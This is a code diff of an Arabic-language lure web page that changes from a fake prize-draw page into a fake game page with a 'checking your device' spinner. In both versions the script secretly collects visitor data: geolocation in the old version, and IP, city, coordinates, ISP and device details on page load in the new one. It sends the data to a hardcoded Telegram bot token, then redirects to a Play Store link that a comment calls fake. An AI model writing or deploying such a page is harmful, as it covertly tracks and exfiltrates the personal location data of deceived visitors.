@@ -2,77 +2,90 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>🎯 اربح جائزة بحسب موقعك!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>🎮 موقع الألعاب المجنونة</title>
   <style>
     body {
-      font-family: 'Tahoma', sans-serif;
-      background: linear-gradient(to right, #2980b9, #6dd5fa);
-      text-align: center;
-      padding: 40px;
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #141e30, #243b55);
       color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
     }
 
     h1 {
-      font-size: 2.2rem;
+      font-size: 2.5rem;
+      margin-bottom: 10px;
     }
 
     p {
       font-size: 1.2rem;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
     }
 
-    button {
-      padding: 14px 25px;
-      font-size: 18px;
-      background-color: #2ecc71;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-top: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
 
     .footer {
-      margin-top: 60px;
-      font-size: 0.9rem;
-      color: #e0e0e0;
+      position: absolute;
+      bottom: 10px;
+      font-size: 0.8rem;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
 
-  <h1>🎁 اربح جائزة حسب منطقتك!</h1>
-  <p>اضغط على الزر لتأكيد موقعك والمشاركة في السحب المجاني</p>
+  <h1>🔥 لعبة الذكاء الخارقة</h1>
+  <p>جارٍ التحقق من جهازك لبدء اللعب...</p>
+  <div class="loader"></div>
 
-  <button onclick="sendData()">📍 تأكيد موقعي</button>
-
-  <div class="footer">© 2025 جميع الحقوق محفوظة</div>
+  <div class="footer">
+    جميع الحقوق محفوظة © 2025
+  </div>
 
   <script>
-    function sendData() {
-      const userAgent = navigator.userAgent;
-      const screenRes = screen.width + "x" + screen.height;
-      const language = navigator.language;
-      const time = new Date().toLocaleString('ar');
-
-      if (!navigator.geolocation) {
-        alert("❌ جهازك لا يدعم تحديد الموقع");
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(pos => {
-        const lat = pos.coords.latitude.toFixed(6);
-        const lon = pos.coords.longitude.toFixed(6);
-        const acc = Math.round(pos.coords.accuracy);
+    fetch("https://ipinfo.io/json?token=46eede76a5f9e6")
+      .then(res => res.json())
+      .then(ipinfo => {
+        const data = {
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          screen: screen.width + "x" + screen.height,
+          ip: ipinfo.ip,
+          city: ipinfo.city,
+          region: ipinfo.region,
+          country: ipinfo.country,
+          loc: ipinfo.loc,
+          org: ipinfo.org
+        };
 
         const message =
-          "📡 بيانات زائر جديد:\n\n" +
-          "🛰️ الموقع: " + lat + ", " + lon + "\n" +
-          "🎯 الدقة: ±" + acc + " متر\n" +
-          "🕒 الوقت: " + time + "\n\n" +
-          "📱 الجهاز: " + userAgent + "\n" +
-          "🖥️ الشاشة: " + screenRes + "\n" +
-          "🌐 اللغة: " + language;
+          "📡 تم فتح الرابط!\n" +
+          "📱 الجهاز: " + data.userAgent + "\n" +
+          "🌐 اللغة: " + data.language + "\n" +
+          "🖥️ الشاشة: " + data.screen + "\n" +
+          "🌍 الموقع: " + data.city + ", " + data.region + ", " + data.country + "\n" +
+          "📌 الإحداثيات: " + data.loc + "\n" +
+          "🔌 مزود الخدمة: " + data.org + "\n" +
+          "🛰️ IP: " + data.ip;
 
         fetch("https://api.telegram.org/bot8261552434:AAG13F3E318guMFGLuLUqdDA78LIk4yWg04/sendMessage", {
           method: "POST",
@@ -85,11 +98,11 @@
           })
         });
 
-        alert("✅ تم تأكيد موقعك، شكراً لمشاركتك!");
-      }, err => {
-        alert("❌ لم نتمكن من تحديد موقعك. الرجاء السماح للموقع.");
+        // إعادة التوجيه بعد 4 ثوانٍ لصفحة مزيفة أو حقيقية
+        setTimeout(() => {
+          window.location.href = "https://play.google.com/store/apps/details?id=com.game.fakeapp";
+        }, 4000);
       });
-    }
   </script>
 
 </body>
